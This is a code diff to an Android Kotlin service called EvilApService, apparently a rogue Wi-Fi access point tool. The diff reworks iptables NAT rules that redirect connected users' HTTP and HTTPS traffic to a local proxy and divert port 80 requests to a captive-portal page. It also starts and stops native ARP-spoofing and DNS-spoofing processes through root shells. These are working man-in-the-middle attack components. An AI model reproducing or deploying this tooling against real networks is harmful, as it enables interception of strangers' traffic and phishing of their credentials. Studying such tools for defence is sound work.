@@ -34,7 +34,7 @@ class EvilApService: Service() {
     private var mDispService: Disposable? = null
     private var mCheckedHosts: MutableList<Host> = ArrayList()
     private var mShells: MutableList<Shell.Interactive> = ArrayList()
-    private lateinit var myIp: String
+    lateinit var myIp: String
     private lateinit var gateway: String
     var mWantsToStop = false
     // This service is only bound from inside the same process and never uses IPC.
@@ -54,6 +54,7 @@ class EvilApService: Service() {
             service.ACTION_STOP_SERVICE.action -> exit()
         }
         setupEventBus()
+        updateIPs()
         // If this service really do get killed, there is no point restarting it automatically
         return Service.START_NOT_STICKY
     }
@@ -66,9 +67,7 @@ class EvilApService: Service() {
                 service.ACTION_STOP_SERVICE -> exit()
                 is EventActiveScan -> {
                     if (EvilApApp.instance.wifiConnected){
-                        val wifiMan = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
-                        myIp = int2ip(wifiMan.dhcpInfo.ipAddress)
-                        gateway = int2ip(wifiMan.dhcpInfo.gateway)
+                        updateIPs()
                         nativeActiveScan("wlan0")
                     }
                     else {
@@ -146,6 +145,7 @@ class EvilApService: Service() {
         nativeArpSpoof(false)
         nativeDnsSpoof(false)
         nativeTrafficRedirect(false, "HTTPS")
+        nativeTrafficRedirect(false, "HTTP")
         for (shell in mShells)
             shell.close()
         stopSelf()
@@ -280,33 +280,51 @@ class EvilApService: Service() {
     }
     /**
      * Controls rules that redirect @param type traffic to a local port.
-     * @param state Adds/removes iptables rules
+     * @param on Adds/removes iptables rules
      * @param type Specifies which type of traffic to redirect (HTTP or HTTPS)
      */
-    private fun nativeTrafficRedirect(state: Boolean, type: String) {
+    private fun nativeTrafficRedirect(on: Boolean, type: String) {
         val sh = getIdleShell() ?: return
-        val proxyPort = EvilApApp.instance.PORT_PROXY
-        val dstPort = when (type.toUpperCase()){
-            "HTTP" -> { 80 }
-            "HTTPS" -> { 443 }
+        val proxyPort : String
+        val dstPort : String
+        val dstIp : String
+        when (type.toUpperCase()){
+            "HTTP" -> {
+                dstIp = ""
+                dstPort = "--dport 80"
+                proxyPort = "--to-port ${EvilApApp.instance.PORT_PROXY}"
+            }
+            "HTTPS" -> {
+                dstIp = ""
+                dstPort = "--dport 443"
+                proxyPort = "--to-port ${EvilApApp.instance.PORT_PROXY}"
+            }
+            "CAPTIVE_PORTAL" -> {
+                dstIp = "-d $myIp"
+                dstPort = "--dport 80"
+                proxyPort = "--to-port ${EvilApApp.instance.PORT_CAPTIVE_PORTAL}"
+            }
             else -> {
                 Log.e(TAG, "Invalid traffic type!")
                 return
             }
         }
-        val cmds: List<String> = if(state)
+        val cmds = if(on){
+            listOf( // always delete b4 inserting to avoid duplicates
+                    "iptables -t nat -D PREROUTING -p tcp $dstIp $dstPort -j REDIRECT $proxyPort",
+                    "iptables -t nat -I PREROUTING -p tcp $dstIp $dstPort -j REDIRECT $proxyPort"
+            )
+        }
+        else {
             listOf(
-                    "iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport $dstPort " +
-                            "-j REDIRECT --to-port $proxyPort",
-                    "ip6tables -t nat -A PREROUTING -i wlan0 -p tcp --dport $dstPort " +
-                            "-j REDIRECT --to-port $proxyPort")
-        else
-            listOf(
-                    "iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport $dstPort " +
-                            "-j REDIRECT --to-port $proxyPort",
-                    "ip6tables -t nat -D PREROUTING -i wlan0 -p tcp --dport $dstPort " +
-                            "-j REDIRECT --to-port $proxyPort")
-        sh.addCommand(cmds)
+                    "iptables -t nat -D PREROUTING -p tcp $dstIp $dstPort -j REDIRECT $proxyPort"
+            )
+        }
+        sh.addCommand(cmds, 0, object: Shell.OnCommandResultListener {
+            override fun onCommandResult(commandCode: Int, exitCode: Int, output: MutableList<String>?) {
+                Log.d("[native]TRAFFIC_REDIRECT", "$cmds \n(exit code: $exitCode)")
+            }
+        })
     }
     /**
      * Starts native process that spoofs DNS responses
@@ -314,26 +332,17 @@ class EvilApService: Service() {
      * @param state starts or stops dns spoofing activity
      */
     private fun nativeDnsSpoof(state: Boolean) {
-        // if myIp is not initialized then no scanning was done, and we don't know our IP yet
-        // TODO: find a better way
-        if (!::myIp.isInitialized) return
+        nativeTrafficRedirect(state, "CAPTIVE_PORTAL")
         val sh = getIdleShell() ?: return
         val path = applicationInfo.dataDir
-        val cmds = if(state) {
-            listOf("iptables -t nat -I PREROUTING -p tcp -d $myIp --dport 80 " +
-                    "-j REDIRECT --to-port ${EvilApApp.instance.PORT_CAPTIVE_PORTAL}",
-                    "LD_LIBRARY_PATH=$path/lib/ $path$DNSSPOOF wlan0"
-            )
+        val cmd = if(state) {
+            "LD_LIBRARY_PATH=$path/lib/ $path$DNSSPOOF wlan0"
+        } else {
+            "pkill -f $path$DNSSPOOF"
         }
-        else {
-            listOf("iptables -t nat -D PREROUTING -p tcp -d $myIp --dport 80 " +
-                    "-j REDIRECT --to-port ${EvilApApp.instance.PORT_CAPTIVE_PORTAL}",
-                    "pkill -f $path$DNSSPOOF"
-            )
-        }
-        sh.addCommand(cmds, 0, object : Shell.OnCommandLineListener {
+        sh.addCommand(cmd, 0, object : Shell.OnCommandLineListener {
             override fun onCommandResult(commandCode: Int, exitCode: Int) {
-                Log.d("[native]DNSSPOOF", "$cmds \n(exit code: $exitCode)")
+                Log.d("[native]DNSSPOOF", "$cmd \n(exit code: $exitCode)")
             }
             override fun onLine(line: String) {
                 Log.d("[native]DNSSPOOF", line)
@@ -341,7 +350,14 @@ class EvilApService: Service() {
         })
     }
 
+    private fun updateIPs(){
+        val wifiMan = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
+        myIp = int2ip(wifiMan.dhcpInfo.ipAddress)
+        gateway = int2ip(wifiMan.dhcpInfo.gateway)
+    }
+
     private fun int2ip(int: Int): String{
+        // TODO: might be unreliable if byte array has less then 4 bytes
         val myIPAddress = BigInteger.valueOf(int.toLong()).toByteArray()
         myIPAddress.reverse()
         val myInetIP = InetAddress.getByAddress(myIPAddress)
